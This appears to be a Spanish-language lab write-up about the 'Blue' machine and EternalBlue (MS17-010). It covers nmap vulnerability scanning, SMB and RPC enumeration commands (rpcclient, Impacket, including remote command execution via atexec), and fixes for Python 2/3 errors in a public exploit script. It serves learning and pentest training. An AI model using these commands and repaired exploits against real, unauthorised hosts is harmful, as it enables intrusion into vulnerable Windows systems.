---
title: "Eternal Blue"
description: "How to identify Eternal Blue"
date: "2025-11-21"
banner:
  src: "../../images/eternal-blue.jpg"
  alt: "Ocean image"
  caption: 'Photo by <a href="https://unsplash.com/@tarafuco">Tanja Cotoaga</a> on Unsplash'
categories:
  - "KEV"
  - "EternalBlue"
  - "Windows 7"
  - "SMBv1"
keywords:
  - "KEV"
  - "EternalBlue"
  - "Windows 7"
  - "SMBv1"
---

# Que aprendi de la maquina Blue

## Nmap default scripts are not vuln

Nmap utiliza default scripts, esto significa que no descubrira vectores vulnerables como EternalBlue con el flag -sCV.

Para descubrir vectores conocidos con Nmap podemos scanear por categoria de scripts:

```sh
└─$ nmap -sS --script "vuln,auth" -vv --open -p 135,139,445,49152,49153,49154,49155,49156,49157 -Pn -n 10.10.10.40 -oN vuln.ports
```

De este modo vemos resultados para EternalBlue con los scripts de la categoria vuln de Nmap.

```sh
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```


## EternalBlue

Una idea recurrente en seguridad es reconocer vectores, patrones o versiones vulnerables, de ahi que veamos los resultados de Nmap default y pensemos en probar si el Host es vulnerable a EternalBlue.

```sh
Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
```

Otra traza que nos puede ayudar a advertir EternalBlue es la version 1 de SMB, que podemos obtener con el script `smb-protocols`:

```sh
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
```

### Windows 7 Professional Service Pack 1

Si el sistema es Windows 7 Professional SP1 es candidato para MS17-010 (EternalBlue) que afecta justamente a SMBv1 en Windows 7/2008R2 y similares.

Condiciones que te tienen que disparar la alerta “¿MS17-010?”
1. Puerto 445/TCP abierto (SMB).
2. Sistema operativo en el rango vulnerable:
   1. Windows 7 (sobre todo SP1).
   2. Windows Server 2008 / 2008 R2.
   3. (En entornos más viejos, también XP/2003).
3. Indicios de SMBv1 habilitado (muy típico en esos sistemas antiguos).

Un mini-playbook para cualquier objetivo que huela a Windows 7 con SMB:
1. Escaneo de puertos: ¿está 445 abierto?
2. smb_version o smb-os-discovery: ¿Windows 7 / 2008 R2?
3. smb-vuln-ms17-010 o smb_ms17_010: ¿reporta vulnerable?


## SMB

SMB es uno de los vectores de RCE más explotados de Windows en la historia. Si ves SMB en una máquina vieja, piensa que SMB nunca es un puerto “pasivo”:
1. ¿Es MS17-010?
2. ¿Es MS08-067?
3. ¿Hay null session?
4. ¿Hay shares writeables?
5. ¿SMBv1 activo?


## RPC (Remote Procedure Call)

RPC es el medio por el cual Windows permite que otras máquinas o procesos remotos llamen a funciones internas del sistema operativo (sobre puertos como 135, 49152–49157 y pipes especiales (IPC$))

**RPC es mucho más que “información”, puede lograr RCE real (exploits RPC)**

Ejemplos reales:
1. PrintNightmare (RPC sobre Spooler)
2. ZeroLogon (RPC sobre Netlogon/DCERPC)
3. PetitPotam (RPC MS-EFSR)
4. MS08-067 (RPC sobre SMB)
5. DFSCoerce / PrinterBug / etc.

### Validaciones con rpcclient

```sh
rpcclient -U "" -N <IP>
enumdomusers
enumdomgroups
queryuser 500
spoolss_enum_printers
eventlog_open Application
eventlog_read 1
lsaquery
lookupnames Administrator
querydispinfo
```

### Scripts de Impacket

```sh
impacket-lookupsid ''@<IP>
impacket-samrdump <IP>
impacket-rpcdump @<IP>
impacket-atexec user:pass@<IP> "cmd /c whoami"
impacket-coercer -t <IP> -p spoolss
```




## Versiones Compatibles

Tanto por Python 2 y Python 3 el script provoca errores, antes de modificar grueso probamos movernos a Python 2 con "virtualenv".

### f-strings sin soporte

En este caso, la ultima version de impacket necesaria para ejecutar el script no soporta que impacket utilice f-string sobre Python 2. Basicamente, impacket ha dejado sin soporte Python 2 y crashea.

```sh
# f-strings sin soporte
Traceback (most recent call last):
    av_pairs[NTLMSSP_AV_TARGET_NAME] = f"{service}/".encode('utf-16le') + av_pairs[NTLMSSP_AV_DNS_HOSTNAME][1]
                                                   ^
SyntaxError: invalid syntax
```

Para resolverlo debemos movernos a una version de impacket que soporte Python 2.

```sh
pip install impacket==0.9.21
```


### can't concat str to byte

En Python 3 todo debe ser bytes para operar payloads binarios.
Al concatenar bytes con una string se produce un error de normalizacion, pack() devuelve bytes, pero `'A'*0xffde` es una string. 

```sh
Traceback (most recent call last):
  File "/home/b45lk/audit/study/OSCP/week01/blue_audit/exploits/EternalBlue.py", line 83, in <module>
    ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde
                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~
TypeError: can't concat str to bytes
```

Para resolverlo convertimos la string en formato bytes con prefijo `b'A'` o con encode `('A' * 0xffde).encode()`

```py
ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + b'A' * 0xffde
ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + ('A' * 0xffde).encode()
```


## 'ascii' codec can't decode byte 0xa4

Una vez mas, Python 2 falla al manejar bytes y strings. En este caso, analizamos la linea en conflicto:

```sh
# El choclisimo de la misma vida nos lleva a la linea que falla (exagere un poco, este error no es tan largo)
Traceback (most recent call last):
  File "zzz_exploit.py", line 1113, in <module>
  File "zzz_exploit.py", line 1110, in main
  File "zzz_exploit.py", line 981, in exploit
  File "zzz_exploit.py", line 545, in exploit_matched_pairs
  File ... line 401, in send_nt_trans_secondary
  File ... line 397, in create_nt_trans_secondary_packet
  File ... line 89, in _put_trans_data
    # error:
    transData += (b'\x00' * padLen) + str.encode(data)
UnicodeDecodeError: 'ascii' codec can't decode byte 0x91 in position 2: ordinal not in range(128)
```

Tomando como experiencia el caso anterior, podemos pensar que el conflicto sucede porque la salida espera bytes pero los datos son strings. Pero si miramos el codigo vemos que aparentemente todo esta bien codificado.

Haremos unas pruebas:

```py
# ❌ fail: mismo error
('\x00' * padLen).encode()
# ❌ fail: TypeError: can't multiply sequence by non-int of type 'str'
('\x00' * str(padLen)).encode() + str.encode(data)
# ✅ success: data ya era bytes
b'\x00' * padLen + data
```

### Modernizando Python 2: Common Crash 

`str.encode(data)` es uno de los crashes más típicos que aparecen al intentar “modernizar” exploits hechos para Python 2.

`str.encode(data)` intenta usar el parámetro data como _codec name_, no como contenido. Cualquier exploit antiguo que veas con `str.encode(data)` o concatenaciones sin prefijo `b''` está casi garantizado que romperá.

**str.encode(data) produce errores como:**

```sh
UnicodeDecodeError: 'ascii' codec can't decode byte ...
TypeError: descriptor 'encode' requires a 'str' object but received 'bytes'
TypeError: can't concat str to bytes
```